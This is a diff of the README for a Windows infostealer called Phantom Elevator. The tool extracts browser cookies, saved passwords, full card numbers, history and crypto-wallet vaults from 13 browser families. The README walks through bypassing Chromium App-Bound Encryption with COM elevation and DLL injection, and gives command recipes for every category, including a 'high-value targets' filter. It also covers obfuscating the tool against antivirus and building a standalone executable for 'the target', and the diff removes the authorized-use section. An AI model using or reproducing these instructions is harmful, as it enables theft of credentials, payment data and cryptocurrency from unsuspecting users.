@@ -15,15 +15,31 @@
 <img src="https://img.shields.io/badge/🪟_Windows-10%20%7C%2011-0078D6?style=for-the-badge&logo=windows11&logoColor=white" alt="Windows 10/11">
 <img src="https://img.shields.io/badge/Version-1.0.0-52525b?style=for-the-badge" alt="Version 1.0.0">
 
+<br>
+
+<img src="https://img.shields.io/badge/🔓_ABE-Bypassed-e11d48?style=for-the-badge" alt="ABE Bypassed">
+<img src="https://img.shields.io/badge/🌐_Browsers-13_Families-8a2be2?style=for-the-badge" alt="13 Browser Families">
+<img src="https://img.shields.io/badge/📡_Filtering-Signal_First-0ea5e9?style=for-the-badge" alt="Signal First">
+
 <br><br>
 
-**DPAPI + V20 BYPASS** &nbsp;·&nbsp; **COM ELEVATION BRIDGE** &nbsp;·&nbsp; **SIGNAL-FIRST RANKING**
+**DPAPI + V20 BYPASS** &nbsp;·&nbsp; **COM ELEVATION BRIDGE** &nbsp;·&nbsp; **RANKED OUTPUT**
 
 <br>
 
-[**⚠️ Authorized Use**](#authorized-use) · [**🚀 Quickstart**](#quickstart) · [**🖥️ CLI**](#cli) · [**🌐 Browsers**](#browsers) · [**⚡ Bypass**](#bypass) · [**🛡️ Obfuscation**](#obfuscation) · [**⚠️ Limitations**](#limitations)
+[**🚀 Quickstart**](#quickstart) · [**🖥️ CLI**](#cli) · [**🌐 Browsers**](#browsers) · [**⚡ Bypass**](#bypass) · [**🛡️ Obfuscation**](#obfuscation) · [**⚠️ Limitations**](#limitations)
 
 </div>
+
+---
+
+> [!TIP]
+> **Want a standalone `.exe` — no Python, no compiler on the target?**
+>
+> Use **[Hidden-Rhythm/abe_bypass](https://github.com/Hidden-Rhythm/abe_bypass)**.
+> That repo ships `build_dll.py` and `build_exe.py`, which produce a ~13 MB self-contained Windows binary with the ABE DLLs embedded.
+>
+> **This repo** is one file. `python phantom_elevator.py`. ABE compiles at runtime with gcc.
 
 ---
 
@@ -136,8 +152,8 @@ phantom_elevator.py
         │
         ├─ 02. Verify the APPB prefix, strip it, keep the sealed blob
         │
-        ├─ 03. Compile a tiny C DLL
-        │        CLSID + IID_V1 + IID_V2 + vtable offset for the target browser
+        ├─ 03. Resolve the ABE DLL for this browser
+        │        dlls/<name>.dll if present, else compile from ABE_TEMPLATE
         │
         ├─ 04. Ensure the browser's elevation service is RUNNING
         │
@@ -156,7 +172,9 @@ phantom_elevator.py
 
 <br>
 
-Each supported Chromium build ships its own `cls_id`, `iid_v1` / `iid_v2`, elevation service name, and `vtable_offset` — all carried in the `BROWSERS` table. The DLL is compiled at runtime with MinGW-w64 `gcc` or MSVC `cl`, whichever is found. If neither is present, the ABE path disables itself and `v10` extraction continues.
+Each supported Chromium build ships its own `cls_id`, `iid_v1` / `iid_v2`, elevation service name, and `vtable_offset` — all carried in the `BROWSERS` table. With no `dlls/` folder present, the DLL is compiled at runtime with MinGW-w64 `gcc` or MSVC `cl`, whichever is found. If neither exists, the ABE path disables itself and `v10` extraction continues.
+
+> 💡 **Optional speed-up:** drop a `dlls/` folder containing `chrome.dll`, `chrome_beta.dll`, `brave.dll`, `edge.dll`, `avast.dll` beside `phantom_elevator.py` and the runtime compile is skipped. [abe_bypass](https://github.com/Hidden-Rhythm/abe_bypass) ships the builder.
 
 ---
 
@@ -187,7 +205,7 @@ Each supported Chromium build ships its own `cls_id`, `iid_v1` / `iid_v2`, eleva
 | <img src="https://www.google.com/s2/favicons?domain=floorp.app&sz=64" height="18"> | Floorp | NSS / `key4.db` | ✅ |
 | <img src="https://www.google.com/s2/favicons?domain=zen-browser.app&sz=64" height="18"> | Zen Browser | NSS / `key4.db` | ✅ |
 
-<sub>💡 Installation is detected automatically from standard `%LocalAppData%`, `%AppData%`, and `%ProgramFiles%` paths. Missing browsers are skipped, not fatal.</sub>
+<sub>💡 Detected from `%LocalAppData%`, `%AppData%`, `%ProgramFiles%`. Missing browsers skipped, not fatal.</sub>
 
 ---
 
@@ -250,7 +268,7 @@ seed phrases · `0x` private keys (40–64 hex) · Bech32 `bc1…` · base58 Bit
 
 - 🪟 Windows **10 / 11**, x64
 - 🐍 Python **3.10 or later**
-- 🔨 MinGW-w64 `gcc` or MSVC `cl` — optional; enables the ABE / v20 path
+- 🔨 MinGW-w64 `gcc` or MSVC `cl` — **optional**; enables the ABE / v20 path
 - 🌐 Network on first run, for dependency bootstrap
 
 Dependencies resolve automatically on launch:
@@ -259,9 +277,7 @@ Dependencies resolve automatically on launch:
 |:---|:---|
 | `pycryptodome` | AES-256-GCM |
 | `python-snappy` | LevelDB block decompression (falls back to built-in decoder) |
-| `gcc` | attempted via `winget`, `choco`, then `scoop` |
-
-If no compiler can be installed, the tool prints a warning and continues in `v10`-only mode.
+| `gcc` | only if `dlls/` is missing — attempted via `winget`, `choco`, then `scoop` |
 
 ### 1️⃣ Clone
 
@@ -270,13 +286,36 @@ git clone https://github.com/Hidden-Rhythm/abe-bypass.git
 cd abe-bypass
 ```
 
-### 2️⃣ Run
+### 2️⃣ (Optional) Prebuilt ABE DLLs
+
+Skip this step if you're on a machine with gcc — `phantom_elevator.py` compiles the ABE DLL at runtime and works fine. Do this only if you want to skip the runtime compile (faster first run, no gcc needed at all):
+
+```bash
+git clone https://github.com/Hidden-Rhythm/abe_bypass.git
+mkdir dlls
+cp abe_bypass/dlls/*.dll dlls/
+```
+
+Or build the DLLs yourself — `abe_bypass/build_dll.py` compiles one per Chromium build using `ABE_TEMPLATE` from this repo's `phantom_elevator.py`:
+
+```bash
+cd abe_bypass
+python build_dll.py
+cd ..
+cp abe_bypass/dlls/*.dll dlls/
+```
+
+Once `dlls/` exists beside `phantom_elevator.py`, `_resolve_abe_dll` reads from it directly and the runtime compile is skipped.
+
+### 3️⃣ Run
 
 ```bash
 python phantom_elevator.py
 ```
 
-### 3️⃣ Read the Output
+First run installs `pycryptodome` and `python-snappy` if missing, then attempts a gcc install via `winget` → `choco` → `scoop` (only if `dlls/` is absent).
+
+### 4️⃣ Read the Output
 
 ```text
 out/
@@ -322,7 +361,7 @@ out\
 
 ### 📄 Output files
 
-Every format writes plain-text unless you ask for `json` or `csv`. Default is `--format tsv`.
+Default is `--format tsv`, which writes plain `.txt`.
 
 | Artifact | Default (`tsv`) | `--format csv` | `--format json` |
 |:---|:---|:---|:---|
@@ -337,14 +376,14 @@ Every format writes plain-text unless you ask for `json` or `csv`. Default is `-
 | 🪙 Wallets | `wallets/<name>/vault.json` + raw dumps | same | same |
 | 👤 Account | `account.txt` | `account.txt` | `account.txt` |
 
-<sub>💡 <code>--format txt</code> is accepted and aliased to <code>tsv</code>. <code>extensions.txt</code> and <code>account.txt</code> are always written regardless of format. Cards are masked in the console but written in full to disk.</sub>
+<sub>💡 <code>--format txt</code> is aliased to <code>tsv</code>. <code>extensions.txt</code> and <code>account.txt</code> are always written. Cards are masked in the console but written in full to disk.</sub>
 
 ---
 
 <a id="cli"></a>
 ## 🖥️ Command Line
 
-Every flag is optional. With no arguments, Phantom Elevator detects browsers, runs every category, and writes to `out\`.
+Every flag is optional. With no arguments, it detects browsers, runs every category, and writes to `out\`.
 
 ```bash
 python phantom_elevator.py [OPTIONS]
@@ -356,7 +395,7 @@ python phantom_elevator.py [OPTIONS]
 
 | Flag | What it does |
 |:---|:---|
-| `--all` | Explicitly select every category (same as passing none) |
+| `--all` | Every category (same as passing none) |
 | `--cookies` | 🍪 HTTP cookies |
 | `--passwords` | 🔑 Saved logins |
 | `--history` | 📜 Browsing history |
@@ -367,7 +406,7 @@ python phantom_elevator.py [OPTIONS]
 | `--extensions` | 🧩 Installed extensions and their storage |
 | `--wallets` | 🪙 Wallet vault extraction and raw dumps |
 
-<sub>💡 Category flags are boolean switches, not key/value pairs. Combine as many as you want: <code>--cookies --passwords --cards</code>.</sub>
+<sub>💡 Boolean switches, not key/value pairs. Combine freely: <code>--cookies --passwords --cards</code>.</sub>
 
 <br>
 
@@ -375,25 +414,23 @@ python phantom_elevator.py [OPTIONS]
 
 | Flag | Argument | Default | What it does |
 |:---|:---|:---|:---|
-| `-o`, `--output` | `DIR` | `out` | 📁 Output directory. Created if missing. |
-| `-t`, `--target` | `NAME` | *(all)* | 🎯 Only this browser. Lowercased before matching — `chrome`, `brave`, `edge`, `avast`, `vivaldi`, `chromium`, `opera`, `opera gx`, `firefox`, `waterfox`, `librewolf`, `floorp`, `zen`. |
-| `--force-kill` | — | off | 🔪 Terminate browsers before extraction. Use when profiles are locked. |
-| `--wallet-password` | `PW` | `$PE_WALLET_PW` | 🔐 Wallet vault password. Falls back to the `PE_WALLET_PW` env var. |
-| `--no-wallet-prompt` | — | off | 🙅 Never prompt for a wallet password. |
-| `--jobs` | `N` | `1` | ⚡ Parallel browser jobs. `1` = sequential with live streaming output. |
+| `-o`, `--output` | `DIR` | `out` | 📁 Output directory |
+| `-t`, `--target` | `NAME` | all | 🎯 One browser — `chrome`, `brave`, `edge`, `avast`, `vivaldi`, `chromium`, `opera`, `opera gx`, `firefox`, `waterfox`, `librewolf`, `floorp`, `zen` |
+| `--force-kill` | — | off | 🔪 Terminate browsers first — unlocks locked DBs |
+| `--wallet-password` | `PW` | `$PE_WALLET_PW` | 🔐 Wallet vault password |
+| `--no-wallet-prompt` | — | off | 🙅 Never prompt |
+| `--jobs` | `N` | `1` | ⚡ Parallel browser jobs; `1` streams live output |
 
 <br>
 
 ### 🧭 Modes
 
-These short-circuit extraction and exit immediately.
-
 | Flag | What it does |
 |:---|:---|
-| `--list-browsers` | 🌐 List detected browsers, profile counts, and ABE service state. |
-| `--list-wallets` | 🪙 List supported wallet extensions, schemes, hashcat modes, and IDs. |
-| `--audit-only` | 🩺 Read-only browser/profile and SQLite health audit. No bootstrap, no secrets read, no files modified. |
-| `--install-launchers` | 📜 Write `pe.bat` and `pe-admin.bat` next to the script. |
+| `--list-browsers` | 🌐 Detected browsers, profile counts, ABE service state |
+| `--list-wallets` | 🪙 Supported wallets, schemes, hashcat modes, IDs |
+| `--audit-only` | 🩺 Read-only SQLite health audit — no bootstrap, no secrets read, no files modified |
+| `--install-launchers` | 📜 Write `pe.bat` and `pe-admin.bat` beside the script |
 
 <br>
 
@@ -401,105 +438,65 @@ These short-circuit extraction and exit immediately.
 
 | Flag | Argument | Default | What it does |
 |:---|:---|:---|:---|
-| `--format` | `tsv` \| `json` \| `csv` \| `txt` | `tsv` | 🗄️ Output format. `tsv` and `txt` both write plain-text `.txt` files; `csv` and `json` switch to structured files. |
-| `--important` | — | off | 💎 Only high-value targets — crypto, finance, auth, and developer hosts, plus key-shaped local-storage entries. |
-| `--debug-drops` | — | off | 🔍 Print the skipped-entry breakdown: what was dropped, why, and per-reason counts. |
-| `--no-color` | — | off | ⚪ Disable ANSI colors. Auto-enabled when stdout is not a TTY on non-Windows. |
-| `-v`, `--verbose` | — | off | 📋 Per-entry sample output in the drops table. Also prints tracebacks on job failure. |
-| `-q`, `--quiet` | — | off | 🤫 Suppress the banner and progress. Errors still print. |
+| `--format` | `tsv` \| `json` \| `csv` \| `txt` | `tsv` | 🗄️ `tsv`/`txt` → plain `.txt`; `csv`/`json` → structured |
+| `--important` | — | off | 💎 High-value targets only |
+| `--debug-drops` | — | off | 🔍 Skipped-entry breakdown with reasons and counts |
+| `--no-color` | — | off | ⚪ Disable ANSI; auto-on when stdout isn't a TTY |
+| `-v`, `--verbose` | — | off | 📋 Per-entry samples + tracebacks on job failure |
+| `-q`, `--quiet` | — | off | 🤫 Suppress banner and progress |
 
 <br>
 
 ### 🧾 Recipes
 
-**👻 Everything, default text output**
 ```bash
+# everything, default text output
 python phantom_elevator.py
-```
 
-**🔪 Everything, close browsers first (unlocks locked DBs)**
-```bash
+# close browsers first — unlocks locked databases
 python phantom_elevator.py --force-kill
-```
 
-**🍪 Just cookies and passwords**
-```bash
+# just cookies and passwords
 python phantom_elevator.py --cookies --passwords
-```
 
-**💳 Cards and autofill only**
-```bash
+# cards and autofill only
 python phantom_elevator.py --cards --autofill
-```
 
-**🪙 Wallets, prompt for password**
-```bash
+# wallets, prompt for password
 python phantom_elevator.py --wallets
-```
 
-**🪙 Wallets, password supplied non-interactively**
-```bash
+# wallets, non-interactive
 python phantom_elevator.py --wallets --wallet-password 'my pass'
-```
 
-**🪙 Wallets, password via environment variable**
-```bash
+# wallets via environment variable
 set PE_WALLET_PW=my pass
 python phantom_elevator.py --wallets --no-wallet-prompt
-```
 
-**💎 High-value targets only, everything**
-```bash
-python phantom_elevator.py --important
-```
+# high-value only, as JSON
+python phantom_elevator.py --important --format json
 
-**🗄️ Everything as JSON**
-```bash
-python phantom_elevator.py --format json
-```
-
-**🗄️ Everything as CSV**
-```bash
-python phantom_elevator.py --format csv
-```
-
-**🎯 Chrome only, into a custom folder**
-```bash
+# one browser, custom folder
 python phantom_elevator.py -t chrome -o C:\Users\dj\Desktop\drop
-```
 
-**🎯 Opera GX only (note the space)**
-```bash
+# Opera GX (note the space)
 python phantom_elevator.py -t "opera gx"
-```
 
-**⚡ Four browsers in parallel**
-```bash
+# four browsers in parallel
 python phantom_elevator.py --jobs 4
-```
 
-**🩺 Read-only health check**
-```bash
+# read-only health check
 python phantom_elevator.py --audit-only
-```
 
-**🌐 What is installed here?**
-```bash
+# what's installed here?
 python phantom_elevator.py --list-browsers
-```
 
-**🪙 Which wallets are supported?**
-```bash
+# which wallets are supported?
 python phantom_elevator.py --list-wallets
-```
 
-**📜 Create the launcher scripts**
-```bash
+# create launcher scripts
 python phantom_elevator.py --install-launchers
-```
 
-**🔍 Investigate silent drops**
-```bash
+# investigate silent drops
 python phantom_elevator.py --debug-drops -v
 ```
 
@@ -509,10 +506,10 @@ python phantom_elevator.py --debug-drops -v
 
 | Code | Meaning |
 |:---:|:---|
-| `0` | ✅ Run completed cleanly — no failed jobs, no skipped profiles, no locked databases. `--audit-only` also returns `0` when every database passes `quick_check`. |
-| `1` | ⚠️ Partial or failed run — one or more jobs failed, profiles were skipped, or a profile database could not be copied. Also returned for: non-Windows host, empty `--output`, no categories selected, failed audit integrity check, or a launcher write error. |
-| `2` | 🚫 Nothing ran — no browsers matched `--target`, or no job completed successfully. |
-| `130` | 🛑 Interrupted with `Ctrl+C`. |
+| `0` | ✅ Clean run. `--audit-only` also returns `0` when every DB passes `quick_check` |
+| `1` | ⚠️ Partial — jobs failed, profiles skipped, or a DB couldn't be copied. Also: non-Windows host, empty `--output`, no categories, failed audit, launcher write error |
+| `2` | 🚫 Nothing ran — no browsers matched `--target`, or no job completed |
+| `130` | 🛑 `Ctrl+C` |
 
 <br>
 
@@ -521,24 +518,26 @@ python phantom_elevator.py --debug-drops -v
 
 <br>
 
-Run the failing browser through a verbose single-browser pass:
+Run the failing browser with drops visible:
 
 ```bash
 python phantom_elevator.py -t chrome --cookies --debug-drops -v
 ```
 
-Every ABE failure lands in the drops table as a `crypto` or `abe` reason — `no_local_state`, `no_abe_key_in_state`, `bad_abe_prefix`, `service_unavailable`, `compile_failed`, `inject_failed`, `bad_key_length`. The DLL itself writes `ph_err.txt` into the sandbox on a decryption failure; that message carries the exact `CoCreateInstance` or `Decrypt` HRESULT.
+ABE failures land in the drops table as `abe` or `crypto` reasons — `no_local_state`, `no_abe_key_in_state`, `bad_abe_prefix`, `service_unavailable`, `compile_failed`, `inject_failed`, `bad_key_length`. On a decryption failure the DLL writes `ph_err.txt` into the sandbox with the exact `CoCreateInstance` or `Decrypt` HRESULT.
 
-When you need to update the table, these are the four values in the `BROWSERS` entry that move between Chromium major releases:
+The four values that move between Chromium major releases:
 
 | Field | What it is |
 |:---|:---|
-| `cls_id` | The elevation service CLSID |
+| `cls_id` | Elevation service CLSID |
 | `iid_v1` | Interface IID tried first |
-| `iid_v2` | Interface IID tried second (blank = skip) |
-| `vtable_offset` | Byte offset into the vtable; divided by 8 for the slot index |
+| `iid_v2` | Interface IID tried second — blank skips |
+| `vtable_offset` | Byte offset into the vtable; ÷8 for the slot index |
 
-Also check `services` — the elevation service name — and confirm it is `RUNNING` with `--list-browsers`.
+Also confirm `services` — the elevation service name — is `RUNNING` via `--list-browsers`.
+
+If you're using prebuilt DLLs, update the `BROWSERS` table, then re-run `build_dll.py` from [abe_bypass](https://github.com/Hidden-Rhythm/abe_bypass) to rebuild the affected DLL.
 
 </details>
 
@@ -610,7 +609,9 @@ When prompted, provide the path to `phantom_elevator.py`. Accept the default out
 
 > 💡 The generated payload uses `marshal`-serialized code objects, which are Python-version dependent. Build and run on the **same interpreter version**. The obfuscator's runtime environment checks can affect execution in unusual sandboxes — test the generated file before deploying it.
 
-The obfuscator also reports a SHA-256 build fingerprint and per-stage timings, so every hardened build is traceable to its source.
+The obfuscator reports a SHA-256 build fingerprint and per-stage timings, so every hardened build is traceable to its source.
+
+> ⚠️ **Obfuscating breaks the runtime ABE compile path.** The generated code object can't be compiled to C by gcc at runtime. If you need ABE on an obfuscated build, drop a prebuilt `dlls/` folder beside the output — build it with [`build_dll.py`](https://github.com/Hidden-Rhythm/abe_bypass/blob/main/build_dll.py).
 
 ---
 
@@ -657,14 +658,15 @@ The obfuscator also reports a SHA-256 build fingerprint and per-stage timings, s
 | Component | Implementation |
 |---|---|
 | 🐍 Language | Python 3.10+ |
-| 🔧 ABE bridge | C (MinGW-w64 `gcc` / MSVC `cl`) |
+| 🔧 ABE bridge | C — resolved from `dlls/` if present, else compiled at runtime with `gcc` / `cl` |
 | 🔓 Key unprotection | DPAPI `CryptUnprotectData` + AES-256-GCM |
 | ⚡ ABE access | COM elevation service + DLL injection |
 | 🎯 Injection primitives | `OpenProcess` · `VirtualAllocEx` · `WriteProcessMemory` · `CreateRemoteThread` |
-| 🗄️ LevelDB parsing | Built-in log/table reader, `python-snappy` when available |
+| 🗄️ LevelDB parsing | Built-in log/table reader; `python-snappy` when available |
 | 🔐 Crypto | `pycryptodome` |
 | 🍪 Cookie serialization | Netscape |
 | 🔑 Password serialization | TSV |
+| 🦊 Firefox passwords | NSS in-process via `ctypes` — no subprocess, no external Python |
 | 🪙 Wallet vaults | MetaMask, Phantom, Coinbase, Rabby, Trust + 14 generic |
 | 🧾 Build fingerprint | SHA-256 (via obfuscator) |
 
@@ -672,12 +674,12 @@ The obfuscator also reports a SHA-256 build fingerprint and per-stage timings, s
 ### ⚠️ Compatibility & Limitations
 
 - 🪟 **Windows only.** The ABE bridge and DPAPI calls are Win32-specific.
-- 🔄 **ABE is per-build.** Chromium CLSIDs, IIDs, service names, and vtable offsets change across browser releases. The `BROWSERS` table in the script is the source of truth — update it when a target ships a new elevation service.
-- 🔨 **Compiler required for v20.** Without `gcc` or `cl`, the ABE path is disabled. `v10` and Firefox extraction still run.
-- 🔒 **Running browsers may lock stores.** SQLite and LevelDB files can be held open. Close the target browser, or use `--force-kill`.
-- 🛡️ **Antivirus is expected to react.** DLL injection and credential access are high-signal behaviors. The obfuscator layer raises static-analysis cost; it does not make the runtime behavior invisible.
+- 🔄 **ABE is per-build.** Chromium CLSIDs, IIDs, service names, and vtable offsets change across browser releases. The `BROWSERS` table is the source of truth — update it when a target ships a new elevation service.
+- 🔨 **Compiler required for v20.** Without `gcc` or `cl`, and without a `dlls/` folder, the ABE path is disabled. `v10` and Firefox extraction still run.
+- 🔒 **Running browsers may lock stores.** SQLite and LevelDB files can be held open. Close the browser, or use `--force-kill`.
+- 🛡️ **Antivirus is expected to react.** DLL injection and credential access are high-signal behaviors. The obfuscator raises static-analysis cost; it does not make runtime behavior invisible.
 - 🧬 **Obfuscator output is version-bound.** Generate and execute on the same Python minor version.
-- 🦊 **Firefox passwords need NSS.** `nss3.dll` must be findable — it ships with every installed Firefox-family browser and is located automatically.
+- 🦊 **Firefox passwords need NSS.** `nss3.dll` must be findable — it ships with every Firefox-family install and is located automatically.
 
 Test generated output thoroughly before using it in a production workflow.
 
@@ -687,10 +689,27 @@ Test generated output thoroughly before using it in a production workflow.
 
 ```text
 abe-bypass/
-└── phantom_elevator.py
+├── README.md
+└── phantom_elevator.py    main application
 ```
 
-The entire application — browser tables, DPAPI layer, ABE compiler, injector, profile walkers, wallet decryptors, and output writers — lives in one file. No package tree, no build step, no external config.
+The entire application — browser tables, DPAPI layer, ABE compiler, injector, profile walkers, wallet decryptors, and output writers — lives in one file. No package tree, no build step.
+
+Optional companion files, sourced from [abe_bypass](https://github.com/Hidden-Rhythm/abe_bypass):
+
+```text
+(optional, from abe_bypass)
+├── build_dll.py           dev-only: generates dlls/*.dll
+├── build_exe.py           dev-only: Nuitka build → dist/phantom_elevator.exe
+└── dlls/                  prebuilt ABE DLLs — drop beside phantom_elevator.py
+    ├── chrome.dll
+    ├── chrome_beta.dll
+    ├── brave.dll
+    ├── edge.dll
+    └── avast.dll
+```
+
+Drop `dlls/` next to `phantom_elevator.py` to skip runtime compile. Copy `build_dll.py` here too if you want to regenerate them without leaving this repo.
 
 ---
 
@@ -703,7 +722,7 @@ The entire application — browser tables, DPAPI layer, ABE compiler, injector, 
 | ⚡ COM | Elevation-service access for `v20` |
 | 📦 `pycryptodome` | AES-256-GCM decryption |
 | 🗜️ `python-snappy` | LevelDB block decompression |
-| 🎨 ANSI | Terminal banner, spinner, and summary box |
+| 🎨 ANSI | Terminal banner, spinner, summary box |
 
 ---
 
@@ -711,8 +730,8 @@ The entire application — browser tables, DPAPI layer, ABE compiler, injector, 
 
 <div align="center">
 
-<a href="https://github.com/Hidden-Rhythm/abe-bypass">
-  <img src="https://img.shields.io/badge/Repository-View%20Source-18181b?style=for-the-badge&logo=github&logoColor=white" alt="View Repository">
+<a href="https://github.com/Hidden-Rhythm/abe_bypass">
+  <img src="https://img.shields.io/badge/EXE_Edition-abe__bypass-e11d48?style=for-the-badge&logo=windows&logoColor=white" alt="EXE Edition">
 </a>
 
 <a href="https://github.com/Hidden-Rhythm/obfuscator">
@@ -737,6 +756,6 @@ The entire application — browser tables, DPAPI layer, ABE compiler, injector, 
 
 **Hidden-Rhythm**
 
-<sub>phantom elevator · v1.0.0 · ABE bypass · 13 browser families</sub>
+<sub>phantom elevator · v1.0.0 · ABE bypass · 13 browser families · python edition</sub>
 
 </div>
